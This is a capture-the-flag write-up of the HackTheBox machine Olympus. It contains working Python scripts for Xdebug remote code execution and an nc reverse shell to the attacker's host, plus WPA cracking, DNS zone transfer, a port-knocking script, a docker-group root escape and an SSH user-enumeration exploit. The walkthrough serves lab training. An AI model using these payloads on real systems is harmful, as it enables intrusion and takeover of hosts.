---
title: HTB: Olympus
url: https://0xdf.gitlab.io/2018/09/22/htb-olympus.html
date: 2018-09-22T14:45:57+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-olympus, ctf, zone-transfer, xdebug, aircrack-ng, 802-11, ssh, port-knocking, docker, cve-2018-15473
---

Olympus was, for the most part, a really fun box, where we got to bounce around between different containers, and a clear path of challenges was presented to us. The creator did a great job of getting interesting challenges such as dns and wifi cracking into a HTB format. There was one jump I wasn’t too excited to have to make, but overall, this box was a lot of fun to attack.

## Box Info

| Name | [Olympus](https://hackthebox.com/machines/olympus)  [Olympus](https://hackthebox.com/machines/olympus) [Play on HackTheBox](https://hackthebox.com/machines/olympus) |
| --- | --- |
| Release Date | 21 Apr 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Olympus |
| Radar Graph | Radar chart for Olympus |
| First Blood User | 01:12:54[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 01:32:03[gweeperx gweeperx](https://app.hackthebox.com/users/1957) |
| Creator | [OscarAkaElvis OscarAkaElvis](https://app.hackthebox.com/users/32334) |

## Recon

### nmap

nmap gives us ssh on 2222, dns (tcp and udp), and web on 80. There’s also something going on with port 22, as it returned filtered (no response) as opposed to closed (responded as closed):

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 05:48 EDT
Nmap scan report for 10.10.10.83
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   open     http
2222/tcp open     EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds

root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 05:50 EDT
Warning: 10.10.10.83 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).
Not shown: 65386 open|filtered ports, 148 closed ports
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 145.09 seconds

root@kali# nmap -sV -sC -p 22,53,80,2222 -oA nmap/initial 10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 05:49 EDT
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
| dns-nsid:
|_  bind.version: Bind
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|     bind
|_    Bind
80/tcp   open     http    Apache httpd
|_http-server-header: Apache
|_http-title: Crete island - Olympus HTB
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-City of olympia
| ssh-hostkey:
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.70%I=7%D=5/21%Time=5B02962B%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.70%I=7%D=5/21%Time=5B029626%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.01 seconds

```

### DNS (53)

TCP 53 is typically not used for DNS, except for zone transfers. Unfortunately, it doesn’t provide much here:

```

root@kali# dig axfr @10.10.10.83 olympus.htb

; <<>> DiG 9.11.3-1-Debian <<>> axfr @10.10.10.83 olympus.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

root@kali# dig @10.10.10.83 olympus.htb

; <<>> DiG 9.11.3-1-Debian <<>> @10.10.10.83 olympus.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 50991
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;olympus.htb.                   IN      A

;; Query time: 90 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 21 20:59:42 EDT 2018
;; MSG SIZE  rcvd: 40

```

We’ll have to remember to come back here if we find any interesting domains to query against.

### Web (80)

#### Site

The site is just a picture of zeus set as `background-image` in css and a favicon:

![1526896409948](https://0xdfimages.gitlab.io/img/1526896409948.png)![1526896485658](https://0xdfimages.gitlab.io/img/1526896485658.png)

```

	<!DOCTYPE HTML>
		<html>
		<head>
			<title>Crete island - Olympus HTB</title>
			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
			<link rel="shortcut icon" href="favicon.ico">
			<link rel="stylesheet" type="text/css" href="crete.css">
		</head>
		<body class="crete">
		</body>
		</html>

```

#### gobuster

Turned up nothing:

```

root@kali# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.83/ -x txt,html,php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.83/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.html,.php
=====================================================
/index.php (Status: 200)

```

#### HTTP Headers

Looking at the raw request / response, there is an interesting headers in the response:

```

HTTP/1.1 200 OK
Date: Mon, 21 May 2018 13:25:39 GMT
Server: Apache
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
Xdebug: 2.5.5
Content-Length: 314
Connection: close
Content-Type: text/html; charset=UTF-8

```

`Xdebug` is a an extension for `php` that allows you to debug websites. The header may indicate that we can do remote debugging.

## Exploiting Create Container - Shell as www-data

### RCE Through Xdebug

There’s couple ways to interact with Xdebug. A developer would have an xdebug extension in their ide, and/or in their browser (there’s tons of plugins for both Chrome and Firefox). It’s worth taking a second and playing with the browser plugins to get a feel for them

But for a more direct path to RCE / shell, we can take the manual route. If you add a cookie `XDEBUG_SESSION=...`, the site will call back to you on default port 9000, and you can pass php commands to it.

[This blog](https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface) describes how to do the attack, albeit in Chinese. There’s a short script he uses to interact, which simply listens on port 9000, receives the connection, and then enters an infinite loop of reading input commands from the command line, and sends them back formatted for xdebug:

```

#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))

```

To test it out, I’ll give Olympus a ping command, and use tcpdump to see if it works.

With script running, use curl to trigger Xdebug:

```

root@kali# curl http://10.10.10.83 -H "Cookie: XDEBUG_SESSION=wpOCvcWXx5"

```

Script gets callback. We can issue ping command:

```

root@kali# ./exploit_xdebug.py
494<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/index.php" language="PHP" xdebug:language_version="7.1.12" protocol_version="1.0" appid="5380" idekey="XDEBUG_ECLIPSE"><engine version="2.5.5"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick
Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>
>> system("ping -c 1 10.10.14.5")
336<?xml version="1.0" encoding="iso-8859-1"?>
<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="61" encoding="base64"><![CDATA[cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA5NC4zNjEvOTUuMDcyLzk1Ljg2MS8wLjU2MiBtcw==]]></property></response>
>>

```

And we see result in tcpdump:

```

root@kali# tcpdump -i 2 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:42:22.296409 IP 10.10.10.83 > kali: ICMP echo request, id 5413, seq 0, length 64
14:42:22.296431 IP kali > 10.10.10.83: ICMP echo reply, id 5413, seq 0, length 64

```

Decoding the data that came back in the `CDATA` block, we’ll see it’s part of the ping output:

```

root@kali# echo cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA5NC4zNjEvOTUuMDcyLzk1Ljg2MS8wLjU2MiBtcw== | base64 -d
round-trip min/avg/max/stddev = 94.361/95.072/95.861/0.562 ms

```

Even better, if we look at the curl command, which has not returned yet, we get the output:

```

root@kali# curl http://10.10.10.83 -H "Cookie: XDEBUG_SESSION=wpOCvcWXx5"
PING 10.10.14.5 (10.10.14.5): 56 data bytes
64 bytes from 10.10.14.5: icmp_seq=0 ttl=62 time=18.276 ms
--- 10.10.14.5 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 18.276/18.276/18.276/0.000 ms

```

### Shell

From the python script above, we’ll give `nc -e` a try and get lucky (since most hosts don’t have the `-e` option):

```

>> system("nc -e /bin/bash 10.10.14.5 8087")

```

```

root@kali# nc -lnvp 8087
listening on [any] 8087 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.83] 57586
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Script to get shell

Wrote script to get shell as www-data, `get_olympic_www_shell.py`

```

#!/usr/bin/env python3

from base64 import b64encode
import requests
import socket
import sys

if len(sys.argv) != 2:
    print("{} [nc port]".format(sys.argv[0]))
    sys.exit()

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("10.10.10.1", 80))
    return s.getsockname()[0]

ip = get_my_ip()
port = sys.argv[1]

print("[!] Have nc listening on {}".format(port))

# Start Listener
local_ip = "0.0.0.0"
local_port = 9000
print("[*] Starting listener on {}:{}".format(local_ip, local_port))
s = socket.socket()
s.bind((local_ip, local_port))
s.listen(10)
print("[+] Listening...")

# Tip server to call back
print("[*] Sending request to tip xdebug")
try:
    r = requests.get("http://10.10.10.83/index.php",
                 headers={"Cookie": "XDEBUG_SESSION=wpOCvcWXx5"},
                timeout=2)
except:
    pass

# Catch callback
conn, addr = s.accept()
client_data = conn.recv(1024)
print("[+] Connection received from {}:{} on port {}".format(addr[0], addr[1], local_port))
cmd = 'system("nc -e /bin/sh {} {}")'.format(ip, port).encode('utf-8')
print("[*] Sending command get shell on port {}".format(port))
conn.sendall(('eval -i 1 -- %s\x00' % b64encode(cmd).decode('utf-8')).encode('utf-8'))

print("[*] Cleaning up. Should have callback")
s.close()
conn.close()

```

Now, to get a shell, with nc listener going, run the script:

```

root@kali# ./get_olympic_www_shell.py 443
[!] Have nc listening on 443
[*] Starting listener on 0.0.0.0:9000
[+] Listening...
[*] Sending request to tip xdebug
[+] Connection received from 10.10.10.83:36262 on port 9000
[*] Sending command get shell on port 443
[*] Cleaning up. Should have callback

```

And get a callback:

```

root@kali# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.83] 48372
‍id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

We now have access to what we’ll later find is called the the Create container.

## Pivot to Olympia Container - Shell as icarus

### Enumeration of Create

It’s quickly clear that this is a stripped down environment, likely a container:

```

‍which python

‍which python3

‍hostname
f00ba96171c5

‍ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:ac:14:00:02
          inet addr:172.20.0.2  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3149050 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2384513 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:421530652 (402.0 MiB)  TX bytes:423441702 (403.8 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:36092 errors:0 dropped:0 overruns:0 frame:0
          TX packets:36092 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:2823261 (2.6 MiB)  TX bytes:2823261 (2.6 MiB)

‍arp -a
? (172.20.0.1) at 02:42:e3:e6:86:2f [ether] on eth0

‍netstat -anop | grep LISTEN
tcp        0      0 127.0.0.11:36933        0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                off (0.00/0/0)

```

There’s only one user on the box, `zeus`, and the only thing in the homedir is `airgeddon`, a tool for WiFi sniffing. Inside `/home/zeus/airgeddon/captured` is a pcap and a note:

```

‍pwd
/home/zeus/airgeddon/captured
‍ls -la
total 304
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt

‍cat papyrus.txt
Captured while flying. I'll banish him to Olympia - Zeus

```

### Cracking 802.11

I’ll pull the cap file back to my workstation using nc, and then use `aircrack-ng` to get the wifi password from the pcap. To do so, we’ll need the SSID, which we find in the first packet:

![1526933143270](https://0xdfimages.gitlab.io/img/1526933143270.png)

```

root@kali# aircrack-ng -e Too_cl0se_to_th3_Sun -w /usr/share/wordlists/rockyou.txt olympia_loot/caputred.cap

                                 Aircrack-ng 1.2

      [00:12:44] 5306144/9822768 keys tested (7499.83 k/s)

      Time left: 10 minutes, 2 seconds                          54.02%

                        KEY FOUND! [ flightoficarus ]

      Master Key     : FA C9 FB 75 B7 7E DC 86 CC C0 D5 38 88 75 B8 5A
                       88 3B 75 31 D9 C3 23 C8 68 3C DB FA 0F 67 3F 48

      Transient Key  : 46 7D FD D8 1A E5 1A 98 50 C8 DD 13 26 E7 32 7C
                       DE E7 77 4E 83 03 D9 24 74 81 30 84 AD AD F8 10
                       21 62 1F 60 15 02 0C 5C 1C 84 60 FA 34 DE C0 4F
                       35 F6 4F 03 A2 0F 8F 6F 5E 20 05 27 E1 73 E0 73

      EAPOL HMAC     : AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38

```

### SSH as icarus

Back at the original `nmap`, there was ssh open on port 2222. With some new passwords in hand, try logging in. Both zeus and root failed with both “flightoficarus” and “Too\_cl0se\_to\_th3\_Sun”. But there’s be several hints here that we’re talking about [Icarus](https://en.wikipedia.org/wiki/Icarus):
- The 802.11 password, “flightoficarus”
- The network name “Too\_cl0se\_to\_th3\_Sun”
- We’ll see later that the first container was named Create, and Icarus and his father escate from Create

If we ssh as icarus with password `Too_cl0se_to_th3_Sun` worked!

```

root@kali# ssh icarus@10.10.10.83 -p 2222
icarus@10.10.10.83's password:
Last login: Sun Apr 15 16:44:40 2018 from 10.10.14.4
icarus@620b296204a3:~$ pwd
/home/icarus

```

We now have access to what we’ll later find is called the Olympia container.

## Pivot to Hades / Olympus - Shell as prometheus

### Enumeration of Olympia

This box is pretty stripped down, matching our suspicion that it’s a container:

```

icarus@620b296204a3:~$ which nc
icarus@620b296204a3:~$ which python
icarus@620b296204a3:~$ which python3
/usr/bin/python3
icarus@620b296204a3:~$ which curl
icarus@620b296204a3:~$ which wget
/usr/bin/wget
icarus@620b296204a3:~$ which ifconfig
icarus@620b296204a3:~$ which arp
icarus@620b296204a3:~$ which ping

```

This box is in a new subnet:

```

icarus@620b296204a3:~$ cat /proc/net/fib_trie | grep -B1 "32 host LOCAL"
           |-- 127.0.0.1
              /32 host LOCAL
--
           |-- 172.19.0.2
              /32 host LOCAL
--
           |-- 127.0.0.1
              /32 host LOCAL
--
           |-- 172.19.0.2
              /32 host LOCAL
icarus@620b296204a3:~$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.1       0x1         0x2         02:42:87:01:fe:61     *        eth0

icarus@620b296204a3:~$ cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0B00007F:9ACD 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 15121 1 ffff9d99fba547c0 100 0 0 10 0
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 15329 1 ffff9d99faae8000 100 0 0 10 0
   2: 020013AC:0016 630F0A0A:870A 01 00000024:00000000 01:0000001E 00000000     0        0 61087 4 ffff9d99f9f2f000 30 5 31 10 -1

```

So the host is listening on 22 (ssh) and on localhost:39629.

In the home directory, there’s a note:

```

icarus@620b296204a3:~$ cat help_of_the_gods.txt

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb

```

### Revisiting Zone Transfer

Back in the initial enumeration phase, we had tried to do a zone transfer, but not come up with anything of interest. With the new subdomain, try a zone transfer again, and this time get a ton of information:

```

root@kali# dig axfr @10.10.10.83 ctfolympus.htb

; <<>> DiG 9.11.3-1-Debian <<>> axfr @10.10.10.83 ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.         86400   IN      A       192.168.0.120
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 95 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 21 21:00:57 EDT 2018
;; XFR size: 15 records (messages 1, bytes 475)

```

### Port Knocking

The note in the zone transfer gives a hint at a way forward: `prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!`

We noticed in the initial nmap that port 22 came back filtered. I’ll hypothesize that those three numbers are a clue for port knocking, and they could open ssh. I’ll also notice that the note was to prometheus (username?), and that the last bit looks like a password.

Wrote a short script to knock, `open_portal_to_Hades.py`:

```

#!/usr/bin/env python

from scapy.all import *
import pyperclip

def SendSyn(ip, port):
    ip=IP(src="10.10.15.99", dst=ip)
    SYN=TCP(sport=7777, dport=port, flags="S", seq=12345)
    send(ip/SYN)

ports = [3456, 8234, 62431]

for port in ports:
    SendSyn("10.10.10.83", port)

print("[+] Portal should be open.\nRun:\nssh prometheus@10.10.10.83\npassword: St34l_th3_F1re!")
print("[*] Putting password on system clipboard. Ctrl + Shift + v to paste")
pyperclip.copy('St34l_th3_F1re!\n')

```

To demonstrate the script, I’ll start with an nmap showing ssh on 22 filtered:

```

root@kali# nmap -p- -sT --min-rate 5000 10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 21:15 EDT
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   open     http
2222/tcp open     EtherNetIP-1

```

Now, run the script:

```

root@kali# ./open_portal_to_Hades.py
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
[+] Portal should be open.
Run:
ssh prometheus@10.10.10.83
password: St34l_th3_F1re!

```

And check nmap again… ssh is open:

```

Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
root@kali# nmap -p- -sT --min-rate 5000 10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 21:15 EDT
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
2222/tcp open  EtherNetIP-1

```

Now we can ssh in, trying the credentials from the txt record:

```

root@kali# ./open_portal_to_Hades.py && ssh prometheus@10.10.10.83
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
[+] Portal should be open.
Run:
ssh prometheus@10.10.10.83
password: St34l_th3_F1re!
prometheus@10.10.10.83's password:

Welcome to

    )         (
 ( /(     )   )\ )   (
 )\()) ( /(  (()/(  ))\ (
((_)\  )(_))  ((_))/((_))\
| |(_)((_)_   _| |(_)) ((_)
| ' \ / _` |/ _` |/ -_)(_-<
|_||_|\__,_|\__,_|\___|/__/

prometheus@olympus:~$

```

### user.txt

Finally, in prometheus’ home dir, we find user.txt:

```

prometheus@olympus:~$ ls
msg_of_gods.txt  user.txt
prometheus@olympus:~$ wc -c user.txt
33 user.txt
prometheus@olympus:~$ cat user.txt
8aa18519...

```

## Privesc to root File System Access

### Enumeration of Olympus

prometheus is the only non-root user on the box. In that homedir, there’s a note:

```

prometheus@olympus:~$ cat msg_of_gods.txt

Only if you serve well to the gods, you'll be able to enter into the

      _
 ___ | | _ _ ._ _ _  ___  _ _  ___
/ . \| || | || ' ' || . \| | |<_-<
\___/|_|`_. ||_|_|_||  _/`___|/__/
        <___'       |_|

```

Luckily, prometheus is in the docker group:

```

prometheus@olympus:/var/run$ groups
prometheus cdrom floppy audio dip video plugdev netdev bluetooth docker

prometheus@olympus:/var/run$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
0207645a2f24        crete               "docker-php-entrypoi…"   2 hours ago         Up 2 hours          80/tcp                                   dreamy_sammet
f00ba96171c5        crete               "docker-php-entrypoi…"   6 weeks ago         Up 3 hours          0.0.0.0:80->80/tcp                       crete
ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   6 weeks ago         Up 3 hours          0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp   rhodes
620b296204a3        olympia             "/usr/sbin/sshd -D"      6 weeks ago         Up 3 hours          0.0.0.0:2222->22/tcp                     olympia

```

Linenum agrees that this is interesting:

```

...[snip]...
We're a member of the (docker) group - could possibly misuse these rights!:
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
...[snip]...

```

### root File System Access Via docker Group

To get access to the entire local file system, we’ll use docker to run one of the images, and we’re going to mount the local file system root in that image, and give ourselves a shell to that system.

`docker run` looks like this: `$ docker run [OPTIONS] IMAGE[:TAG|@DIGEST][COMMAND] [ARG...]` [ref](https://docs.docker.com/engine/reference/run/#general-form)

So we’ll run `docker run -v /:/hostOS -i -t rodhes bash`:
- `-v /:/hostOS` - mount the host’s `/` as `/hostOS` inside the image
- `-i` - interactive
- `-t` - create a tty
- `rodhes` - the name of the image to run, got from `docker ps above`
  - I picked this one because it doesn’t have shell access by others, so it’s less likely to accidentally give the root flag to someone else
- `bash` - command to run

And this does give root access:

```

prometheus@olympus:/dev/shm$ docker run -v /:/hostOS -i -t  rodhes bash
cat: /etc/hostip: No such file or directory

root@6e53f07f626a:/# id
uid=0(root) gid=0(root) groups=0(root)

root@6e53f07f626a:/# cd /hostOS/

root@6e53f07f626a:/hostOS# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old

```

### root.txt

And with full read access to the file system we can grab the flag:

```

root@6e53f07f626a:/hostOS/root# wc -c root.txt
33 root.txt

root@6e53f07f626a:/hostOS/root# cat root.txt
aba48699...

```

## Commentary

This was a really cool box, and in having you jump from container to container, providing different interesting challenges like zone transfers and 802.11 cracking that aren’t typically seen in HTB. And it does it in a way that’s interesting but on the not insanely difficult side of the HTB difficulty spectrum.

The one part of the box that I think put most people off about Olymus, and kept it from being a really great box, was the pivot from getting SSID from the capture to ssh access as icarus. Guessing is often a part of hacking, but, in my opinion, using the SSID as the SSH password was a bit of a stretch. Even having a shared WiFi / SSH password would have been better. And some people were frustrated with getting to the user name of icarus. IppSec said he’s going to use [CVE-2018-15473](https://blog.nviso.be/2018/08/21/openssh-user-enumeration-vulnerability-a-close-look/) and a list of Greek mythological figures to find the username, which is pretty cool (as always, you should watch [his videos](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)). I won’t go into detail here, but, using [this POC](https://github.com/Rhynorater/CVE-2018-15473-Exploit/blob/master/sshUsernameEnumExploit.py), it does work:

```

root@kali# ./sshUsernameEnumExploit.py --port 2222 --username icarus 10.10.10.83
icarus is a valid user!
root@kali# ./sshUsernameEnumExploit.py --port 2222 --username icaruss 10.10.10.83
icaruss is not a valid user!

```

All of that said, I really enjoyed this box, and it’s clear path of interesting challenges.